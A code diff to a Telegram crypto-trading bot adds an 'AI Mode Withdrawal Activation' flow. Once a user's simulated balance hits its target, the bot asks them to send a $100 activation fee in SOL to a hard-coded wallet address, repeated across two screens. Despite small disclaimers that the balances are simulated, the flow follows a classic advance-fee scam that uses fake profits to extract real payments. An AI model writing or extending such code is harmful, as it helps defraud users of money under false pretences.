@@ -1397,6 +1397,48 @@ async def button_handler(update, context):
         waiting_for_ai_target[user.id] = False
         waiting_for_demo_trade.pop(user.id, None)
         await query.message.reply_text(main_menu_text(user.id, user.username or user.first_name or str(user.id)), parse_mode="HTML", reply_markup=main_menu_keyboard(user.id))
+        ai_state = get_ai_state(user.id)
+        if ai_state.get("target_reached"):
+            await query.message.reply_text(
+                "🎉 *AI Mode Target Complete*\n\n"
+                "Your AI Mode target has been reached. AI Mode balances are simulated and are not real funds.\n\n"
+                "Use the option below to view the activation information for AI Mode withdrawal features.",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("💸 Activate AI Mode Withdrawal", callback_data="ai_withdraw_activate")]
+                ])
+            )
+
+    elif data == "ai_withdraw_activate":
+        ai_state = get_ai_state(user.id)
+        if not ai_state.get("target_reached"):
+            await query.answer("This option is available after your AI Mode target is reached.", show_alert=True)
+            return
+        await query.message.reply_text(
+            "🎉 *AI Mode Withdrawal Activation*\n\n"
+            "Your AI Mode target has been reached.\n\n"
+            "A one-time $100 activation fee is requested for access to the AI Mode withdrawal feature (paid in SOL).\n"
+            "Payment does not convert simulated AI Mode balances or profits into real funds. Please confirm the service and fee details before paying.\n\n"
+            "Payment address:\n`A5FDfnEvB4BfywU3zW51EDcGLLkBXgFQYJUnHGYNnnY7`",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💳 Pay $100 Fee", callback_data="ai_withdraw_payment_info")],
+                [InlineKeyboardButton("🔙 Back", callback_data="home")]
+            ])
+        )
+
+    elif data == "ai_withdraw_payment_info":
+        await query.message.reply_text(
+            "💳 *AI Mode Withdrawal Feature Activation*\n\n"
+            "Requested fee: $100, paid in SOL. Confirm the current SOL equivalent and payment terms with support before sending funds.\n\n"
+            "Address:\n`A5FDfnEvB4BfywU3zW51EDcGLLkBXgFQYJUnHGYNnnY7`\n\n"
+            "Do not treat simulated AI Mode balances as real withdrawable funds. This screen does not confirm payment or grant withdrawal access.",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Back", callback_data="ai_withdraw_activate")],
+                [InlineKeyboardButton("🏠 Home", callback_data="home")]
+            ])
+        )
 
     elif data == "pnl_menu":
         if user.id not in PNL_ALLOWED:
@@ -2068,6 +2110,7 @@ async def button_handler(update, context):
         target_reached = target_usd > 0 and current_balance_usd >= target_usd
         if target_reached:
             ai_state["active"] = False
+            ai_state["target_reached"] = True
             save_ai_state_for_user(user.id, ai_state)
             await query.message.reply_text(
                 "🎯 *Target Reached!*\n\n"
